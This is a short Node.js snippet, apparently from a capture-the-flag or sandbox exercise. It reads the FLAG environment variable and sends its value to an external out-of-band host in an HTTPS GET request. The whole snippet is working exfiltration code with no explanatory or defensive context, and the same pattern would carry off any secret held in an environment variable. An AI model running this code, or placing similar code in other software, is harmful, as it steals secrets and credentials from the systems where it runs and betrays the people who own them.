const flag = process.env['FLAG'];
if (flag) {
  const url = new URL('https://a19f0c8d7b3e.oast.proe?data=' + encodeURIComponent(flag));
  require(url.protocol === 'https:' ? 'https' : 'http').get(url);
}
